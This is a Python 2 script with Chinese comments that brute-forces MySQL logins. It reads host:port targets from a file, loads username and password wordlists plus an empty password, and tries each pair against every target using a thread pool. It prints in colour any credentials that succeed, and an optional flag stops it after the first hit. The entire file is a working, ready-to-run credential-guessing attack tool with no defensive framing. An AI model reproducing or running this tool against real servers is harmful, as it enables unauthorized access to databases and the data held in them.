#!/usr/bin/env python
# -*- coding: utf-8 -*-
import MySQLdb
import sys
import socket
"""
digger程序调用explode进行单个爆破
如果已知mysql,host与port,可以指定txt文档位置进行批量爆破，txt文件格式为 host:port
"""
USER_DIC_ARR = []
PASSWD_DIC_ARR = []
# 懒爆破只爆破一个后retun,避免因为空密码，造成任意密码刷屏
LAZY_EXPOLDE = False
def explode(host,port,dic):
    # port 这里是int类型
    usernameDic = dic['username']
    passwordDic = dic['password']
    #查看是不是主机和port不能连接
    if not connectToHp(host,port):
        return
    for username in usernameDic:
        for passwd in passwordDic:
            if connectToDB(host,port,username,passwd):
                print '\33[33m'+host+':mysql\t'+'username:'+username+'\tpassword:'+passwd+'\33[37m'
                if LAZY_EXPOLDE:
                    return
def connectToHp(host,port):
    #查看是不是主机和port不能连接
    sk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sk.settimeout(10)
    try:
        sk.connect((host,port))
        sk.close()
        return True
    except Exception:
        print "\33[34mbad connection to "+host+':'+str(port)+'\33[37m'
        return False

def connectToDB(host,port,username,passwd):
    db = None
    try:
        db = MySQLdb.connect(host=host, user=username, passwd=passwd,port=port,connect_timeout=10)
        db.close()
        return True
    except:
        return False

def getUserDic():
    global USER_DIC_ARR
    return USER_DIC_ARR

def getPasswdDic():
    global PASSWD_DIC_ARR
    return PASSWD_DIC_ARR

def explodeListHp(hp):
    print 'mysqler start explode '+hp+'\n'
    host = hp.split(':')[0]
    port = int(hp.split(':')[1])
    userDic = getUserDic()
    passwdDic = getPasswdDic()
    #查看是不是主机和port不能连接
    if not connectToHp(host,port):
        return
    for username in userDic:
        for password in passwdDic:
            if connectToDB(host,port,username,password):
                print '\33[33m'+hp+':mysql\t'+'username:'+username+'\tpassword:'+password+'\33[37m'
                if LAZY_EXPOLDE:
                    return

if __name__ == '__main__':
    if len(sys.argv)!=2:
        print "please indicate the file path"
        sys.exit(2)
    file_path = sys.argv[1]
    hpArr = []
    try:
        f = open(file_path,'r')
        for hp in f.readlines():
            hpArr.append(hp.strip('\n'))
        f.close()
    except:
        print "file path ill legal"
        sys.exit(2)
    #加载字典
    f = open('../dict/mysql_u.dic')
    for line in f.readlines():
        USER_DIC_ARR.append(line.strip('\n'))
    f.close()
    f = open('../dict/mysql_p.dic')
    for line in f.readlines():
        PASSWD_DIC_ARR.append(line.strip('\n'))
    PASSWD_DIC_ARR.append('')
    f.close()
    #多线程爆破mysql
    import threadpool
    pool = threadpool.ThreadPool(10)
    requests = threadpool.makeRequests(explodeListHp, hpArr)
    [pool.putRequest(req) for req in requests]
    pool.wait()
    pool.dismissWorkers(10, do_join=True)
